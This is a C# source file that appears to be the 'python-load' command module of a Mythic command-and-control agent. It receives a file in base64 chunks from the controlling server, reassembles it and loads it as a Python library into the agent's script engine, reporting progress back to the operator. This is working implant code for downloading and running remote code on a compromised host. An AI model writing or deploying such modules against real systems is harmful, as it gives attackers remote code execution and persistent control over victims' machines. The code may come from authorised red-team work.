using Workflow.Contracts;
using System.Text.Json;
using Workflow.Models;
using Workflow.Utilities;
using System.Collections.Concurrent;
namespace Workflow
{
    public class Plugin : IFileModule
    {
        public string Name => "python-load";
        private IDataBroker messageManager { get; set; }
        private IScriptEngine pythonManager { get; set; }
        private IServiceConfig agentConfig { get; set; }
        private ConcurrentDictionary<string, ServerUploadJob> uploadJobs { get; set; }
        private Dictionary<string, List<byte>> _streams { get; set; }

        public Plugin(PluginContext context)
        {
            this.messageManager = context.MessageManager;
            this.pythonManager = context.ScriptEngine;
            this.agentConfig = context.Config;
            this.uploadJobs = new ConcurrentDictionary<string, ServerUploadJob>();
            this._streams = new Dictionary<string, List<byte>>();
        }

        public async Task Execute(ServerJob job)
        {
            DebugLog.Log($"Executing {Name} [{job.task.id}]");
            PythonLoadArgs pyArgs = JsonSerializer.Deserialize<PythonLoadArgs>(job.task.parameters);

            if (pyArgs is null)
            {
                DebugLog.Log($"{Name} failed to parse args [{job.task.id}]");
                messageManager.AddTaskResponse(new TaskResponse()
                {
                    task_id = job.task.id,
                    user_output = "Failed to parse args.",
                    completed = true
                });
                return;
            }


            //Start Download
            ServerUploadJob uploadJob = new ServerUploadJob(job, agentConfig.chunk_size);
            uploadJob.file_id = pyArgs.file;
            uploadJob.chunk_num = 1;
            //Add job to our tracker
            if (!uploadJobs.TryAdd(job.task.id, uploadJob))
            {
                DebugLog.Log($"{Name} failed to add job to tracker [{job.task.id}]");
                messageManager.AddTaskResponse(new DownloadTaskResponse
                {
                    status = "error",
                    user_output = "failed to add job to tracker",
                    completed = true,
                    task_id = job.task.id
                }.ToJson());
                return;
            }

            _streams.Add(job.task.id, new List<byte>());

            DebugLog.Log($"{Name} starting upload [{job.task.id}]");
            //Officially kick off file upload with Mythic
            messageManager.AddTaskResponse(new UploadTaskResponse
            {
                task_id = job.task.id,
                upload = new UploadTaskResponseData
                {
                    chunk_size = uploadJob.chunk_size,
                    chunk_num = uploadJob.chunk_num,
                    file_id = uploadJob.file_id,
                    full_path = string.Empty,
                },
                user_output = string.Empty
            }.ToJson());
            DebugLog.Log($"{Name} completed [{job.task.id}]");
        }

        public async Task HandleNextMessage(ServerTaskingResponse response)
        {
            DebugLog.Log($"{Name} HandleNextMessage [{response.task_id}]");
            ServerUploadJob uploadJob = this.GetJob(response.task_id);

            //Did we get an upload job
            if (uploadJob is null)
            {
                messageManager.AddTaskResponse(new TaskResponse
                {
                    status = "error",
                    completed = true,
                    task_id = response.task_id,
                    user_output = "Failed to get job",
                }.ToJson());
                return;
            }

            //Did user request cancellation of the job?
            if (uploadJob.cancellationtokensource.IsCancellationRequested)
            {
                messageManager.AddTaskResponse(new TaskResponse
                {
                    status = "error",
                    completed = true,
                    task_id = response.task_id,
                    user_output = "Cancellation Requested",
                }.ToJson());
                await this.CompleteUploadJob(response.task_id);
                return;
            }

            //Update the chunks required for the upload
            if (uploadJob.total_chunks == 0)
            {
                if (response.total_chunks == 0)
                {
                    messageManager.AddTaskResponse(new TaskResponse
                    {
                        status = "error",
                        completed = true,
                        task_id = response.task_id,
                        user_output = "Failed to get number of chunks",
                    }.ToJson());
                    return;
                }

                uploadJob.total_chunks = response.total_chunks; //Set the number of chunks provided to us from the server
            }

            //Did we get chunk data?
            if (String.IsNullOrEmpty(response.chunk_data)) //Handle our current chunk
            {
                messageManager.AddTaskResponse(new TaskResponse
                {
                    status = "error",
                    completed = true,
                    task_id = response.task_id,
                    user_output = "No chunk data received.",
                }.ToJson());
                return;
            }

            //Write the chunk data to our stream
            if (!this.HandleNextChunk(Misc.Base64DecodeToByteArray(response.chunk_data), response.task_id))
            {
                messageManager.AddTaskResponse(new TaskResponse
                {
                    status = "error",
                    completed = true,
                    task_id = response.task_id,
                    user_output = "Failed to process message.",
                }.ToJson());
                await this.CompleteUploadJob(response.task_id);
                return;
            }

            //Increment chunk number for tracking
            uploadJob.chunk_num++;

            //Prepare response to Mythic
            UploadTaskResponse ur = new UploadTaskResponse()
            {
                task_id = response.task_id,
                status = $"Processed {uploadJob.chunk_num}/{uploadJob.total_chunks}",
                upload = new UploadTaskResponseData
                {
                    chunk_num = uploadJob.chunk_num,
                    file_id = uploadJob.file_id,
                    chunk_size = uploadJob.chunk_size,
                    full_path = uploadJob.path
                }
            };

            //Check if we're done
            if (response.chunk_num == uploadJob.total_chunks)
            {
                DebugLog.Log($"{Name} upload complete [{response.task_id}]");
                ur = new UploadTaskResponse()
                {
                    task_id = response.task_id,
                    upload = new UploadTaskResponseData
                    {
                        file_id = uploadJob.file_id,
                        full_path = uploadJob.path,
                    },
                    user_output = "Loaded.",
                    completed = true
                };
                await this.CompleteUploadJob(response.task_id);
            }

            //Return response
            messageManager.AddTaskResponse(ur.ToJson());
        }

        private bool HandleNextChunk(byte[] bytes, string task_id)
        {
            this._streams[task_id].AddRange(bytes);
            return true;
        }

        private ServerUploadJob GetJob(string task_id)
        {
            return this.uploadJobs[task_id];
        }
        /// <summary>
        /// Complete and remove the upload job from our tracker
        /// </summary>
        /// <param name="task_id">The task ID of the upload job to complete</param>
        private async Task CompleteUploadJob(string task_id)
        {
            if (!uploadJobs.ContainsKey(task_id))
            {
                return;
            }

            byte[] fContents = _streams[task_id].ToArray();
            if (pythonManager.LoadPyLib(fContents))
            {
                messageManager.AddTaskResponse(new TaskResponse()
                {
                    task_id = task_id,
                    user_output = "Loaded.",
                    completed = true
                });
            }
            else
            {
                messageManager.AddTaskResponse(new TaskResponse()
                {
                    task_id = task_id,
                    user_output = "Failed to load lib.",
                    completed = true,
                    status = "error"
                });
            }

            uploadJobs.Remove(task_id, out _);


            if (_streams.ContainsKey(task_id) && _streams[task_id] is not null)
            {
                _streams.Remove(task_id);
            }

            this.messageManager.CompleteJob(task_id);
        }
    }
}
